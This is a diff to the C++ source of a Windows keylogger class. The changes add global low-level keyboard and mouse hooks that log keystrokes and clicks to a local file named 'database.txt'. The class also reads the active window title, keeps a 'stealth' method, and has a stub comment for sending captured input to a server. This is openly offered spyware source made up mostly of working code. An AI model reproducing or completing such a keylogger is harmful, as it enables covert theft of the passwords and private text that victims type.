@@ -14,9 +14,6 @@
 
 Keylog::Keylog()
 {
-	mousePosX = 0;
-	mousePosY = 0;
-	keyPressed = 0;
 }
 
 Keylog::~Keylog()
@@ -25,14 +22,12 @@ Keylog::~Keylog()
 
 int		Keylog::getKey()
 {
-
-	return (0);
+	return (keyPressed);
 }
 
-int		Keylog::getMouse()
+COORD	Keylog::getMouse()
 {
-	std::cout << "Hello Mouse !" << std::endl;
-	return (0);
+	return (mousePos);
 }
 
 int		Keylog::getForeground()
@@ -40,6 +35,19 @@ int		Keylog::getForeground()
 	fg = GetForegroundWindow();
 
 	return (0);
+}
+
+void	Keylog::setKey(int key)
+{
+	this->keyPressed = key;
+}
+
+void	Keylog::setMouse(int x, int y)
+{
+	COORD	pos;
+	pos.X = x;
+	pos.Y = y;
+	mousePos = pos;
 }
 
 int		Keylog::stealth()
@@ -51,49 +59,113 @@ int		Keylog::stealth()
 	return (0);
 }
 
+bool	Keylog::peekMsg(void)
+{
+	return (PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE) != 0);
+}
 
 LRESULT CALLBACK Keylog::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
-	char ch;
+	char	ch;
+	FILE	*file_db;
 
-	std::cout << "In keykey" << std::endl;
-	if (((DWORD)lParam & 0x40000000) && (HC_ACTION == nCode))
-	{
-		std::cout << "In in keyboardproc" << std::endl;
-		if ((wParam == VK_SPACE) || (wParam == VK_RETURN) || (wParam >= 0x2f) && (wParam <= 0x100))
+	if (nCode < 0)
+		return CallNextHookEx(NULL, nCode, wParam, lParam);
+
+	ch = 0;
+	file_db = fopen("database.txt", "a+");
+
+	tagKBDLLHOOKSTRUCT *str = (tagKBDLLHOOKSTRUCT *)lParam;
+
+		switch (str->flags)
 		{
-			if (wParam == VK_RETURN)
-			{
-				ch = '\n';
-				//fwrite(&ch, 1, 1, myKeylogfile);
-				std::cout << &ch << std::endl;
-			}
-			else
-			{
-				BYTE ks[256];
-				GetKeyboardState(ks);
-
-				WORD w;
-				UINT scan = 0;
-				ToAscii(wParam, scan, ks, &w, 0);
-				ch = char(w);
-				//fwrite(&ch, 1, 1, myKeylogfile);
-				std::cout << &ch << std::endl;
-			}
-			//fclose(myKeylogfile);
+			case (LLKHF_ALTDOWN):
+				delete str;
+				return 1;
 		}
+
+		ch = (char)str->vkCode;
+		if (wParam == WM_KEYDOWN)
+		{
+			switch (str->vkCode)
+			{
+				case VK_MENU:
+					std::cout << "SPECIAL PRESS" << std::endl;
+					delete str;
+					return 1;
+			}
+			std::cout << "VK_Code : " << str->vkCode << std::endl;
+			std::cout << "Char Ascii : " << ch << std::endl;
+			std::cout << std::endl;
+
+			if (str->vkCode == VK_RETURN)
+			{
+				// Send to server msg
+			}
+			else if (str->vkCode == VK_SPACE || (ch >= 0 && ch <= 127))
+			{
+				fwrite(&ch, 1, 1, file_db);
+			}
+		}
+	return CallNextHookEx(0, nCode, wParam, lParam);
+}
+
+LRESULT CALLBACK Keylog::LowLevelMouseProc(int code, WPARAM wParam, LPARAM lParam)
+{
+	FILE		*file_db;
+	std::string	msg;
+	std::string	msg_buff;
+
+	file_db = fopen("database.txt", "a+");
+
+	if (code == HC_ACTION)
+	{
+
+		msg = "";
+		switch (wParam)
+		{
+		case WM_LBUTTONDOWN:
+			msg = "WM_LBUTTONDOWN"; break;
+		case WM_MOUSEMOVE:
+			break;
+		case WM_RBUTTONDOWN:
+			msg = "WM_RBUTTONDOWN"; break;
+		default:
+			msg_buff = "Unknown msg: " + wParam;
+			break;
+		}
+		if (msg != "")
+		{
+			std::cout << "< MouseClick pressed >" << std::endl;
+			std::cout << msg << std::endl;
+			fwrite(msg.c_str(), 1, msg.length(), file_db);
+		}
+
 	}
 
-	LRESULT RetVal = CallNextHookEx(0, nCode, wParam, lParam);
-	return  RetVal;
+	return CallNextHookEx(0, code, wParam, lParam);
+}
+
+std::string	Keylog::GetActiveWindowTitle()
+{
+	char wnd_title[256];
+
+	HWND hwnd = GetForegroundWindow(); // get handle of currently active window
+	GetWindowText(hwnd, wnd_title, sizeof(wnd_title));
+	return (wnd_title);
 }
 
 bool Keylog::installhook()
 {
-	//fclose(myKeylogfile);
 	std::cout << "- in installhook" << std::endl;
-	hkb = SetWindowsHookEx(WH_KEYBOARD, &KeyboardProc, NULL, 0);
-	std::cout << hkb << std::endl;
-	std::cout << "- out installhook" << std::endl;
+	
+	if (!(hkb = SetWindowsHookEx(WH_KEYBOARD_LL, &KeyboardProc, NULL, 0))) {
+		std::cout << "Failed Install Hook" << std::endl;
+		return (false);
+	}
+	if (!(hm = SetWindowsHookEx(WH_MOUSE_LL, &LowLevelMouseProc, NULL, 0))) {
+		std::cout << "Failed Install Hook" << std::endl;
+		return (false);
+	}
 	return true;
 }
